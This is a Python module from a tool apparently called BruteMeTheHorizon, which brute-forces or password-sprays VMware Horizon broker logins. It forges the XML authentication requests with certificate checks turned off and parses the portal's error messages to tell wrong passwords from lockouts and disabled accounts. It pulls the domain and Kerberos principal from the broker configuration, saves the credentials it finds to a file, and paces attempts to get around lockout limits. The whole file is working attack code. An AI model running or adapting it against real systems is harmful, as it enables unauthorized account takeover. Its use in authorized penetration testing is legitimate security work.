import logging
import sys
import time
import xml.etree.ElementTree as ET
from datetime import timedelta

import requests
import urllib3

from brutemethehorizon.config import Config

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger('horizon')


def parse_error(data):
    root = ET.fromstring(data)
    params = root.find("./submit-authentication/authentication/screen/params")
    if params is not None:
        for param in params:
            if param.find('name').text == "error":
                try:
                    return param.find('values')[0].text
                except AttributeError as ae:
                    logging.error(f'While parsing: {ae}')
                    return None
    else:
        try:
            msg = root.find('./submit-authentication/user-message').text
            return msg
        except AttributeError as ae:
            logging.error(f'While parsing {ae}')
            return None


def auth(url, username, password, domain):
    data = auth_format.format(username, domain, password)
    try:
        r = requests.post(url, headers=prepare_headers(url), data=data, verify=False)
    except Exception as e:
        logging.error(f'{e}')
        return None
    err = parse_error(r.text)
    return err


def prepare_headers(url):
    # Headers for requests
    url_domain = url.split('/')[2]
    headers = {
        'Connection': 'keep-alive',
        'Accept': '*/*',
        'Origin': 'https://{0}',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': Config.user_agent,
        'DNT': '1',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Referer': 'https://{0}/portal/webclient/index.html',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7'
    }
    headers['Origin'] = headers['Origin'].format(url_domain)
    headers['Referer'] = headers['Referer'].format(url_domain)
    return headers


# Auth XML string
auth_format = "<?xml version='1.0' encoding='UTF-8'?><broker version='14.0'><do-submit-authentication><screen><name>windows-password</name><params><param><name>username</name><values><value>{}</value></values></param><param><name>domain</name><values><value>{}</value></values></param><param><name>password</name><values><value>{}</value></values></param></params></screen></do-submit-authentication></broker>"
non_auth_msg = "Unknown user name or bad password."
limit_auth_msg = "Maximum login attempts exceeded."
disabled_msg = "Your account is currently disabled."
locked_msg = "Account locked out."
cannot_use_msg = "You are not entitled to use the system."


def parse_config(data):
    root = ET.fromstring(data)
    screen_auth_el = root.find('./configuration/authentication/screen')
    auth_type = screen_auth_el.find('name').text
    if auth_type != 'windows-password':
        logging.critical('BruteMeTheHorizon support only domain authentication')
        sys.exit(1)
    bsp = root.find('./configuration/broker-service-principal')
    kerberos = "{}({})".format(bsp[0].text, bsp[1].text)
    domain = ""
    for param in screen_auth_el.find('params'):
        if param.find("name").text == "domain":
            domain = param.find('values')[0].text
            break
    if domain:
        return kerberos, domain
    else:
        logging.critical('Error while parsing config')
        sys.exit(1)


def check(url):
    data = "<?xml version='1.0' encoding='UTF-8'?><broker version='13.0'><set-locale><locale>en</locale></set-locale><get-configuration><supported-features><feature>lastUserActivity</feature><feature>reauthentication</feature><feature>nameResolution</feature><feature>redirection</feature><feature>workspaceOneMode</feature><feature>shadowSessions</feature></supported-features></get-configuration></broker>"
    r = requests.post(url, headers=prepare_headers(url), data=data, verify=False)
    return parse_config(r.text)


def prepare_url(url):
    if '/' in url:
        domain = url.split('/')[2]
    else:
        domain = url
    return f"https://{domain}/broker/xml"


def write_data(creds, f):
    if len(creds) > 0:
        if type(creds) == dict:
            creds = [f'{k}:{v}' for k, v in creds.items()]
        with open(f, "a") as file:
            for account in creds:
                file.write(f"{account}\n")


def get_list_from_file(_file):
    with open(_file, "r") as f:
        _list = [line.strip() for line in f if line.strip() not in [None, ""]]
    return _list


def timer(lock_time, message):
    if lock_time <= 0:
        return
    # From: https://github.com/byt3bl33d3r/SprayingToolkit/blob/master/core/utils/time.py
    delay = timedelta(
        hours=0,
        minutes=lock_time,
        seconds=0
    )
    sys.stdout.write('\n\n')
    for remaining in range(int(delay.total_seconds()), 0, -1):
        print(f"{message} {timedelta(seconds=remaining - 1)}")
        time.sleep(1)
        sys.stdout.write('\x1b[1A')
        sys.stdout.write('\x1b[2K')
    sys.stdout.write('\n\n')


def get_chunks_from_list(_list, n):
    for i in range(0, len(_list), n):
        yield _list[i:i + n]


def check_last_chunk(sublist, full_list):
    """ Identify if the current list chunk is the last chunk """
    if sublist[-1] == full_list[-1]:
        return True
    return False
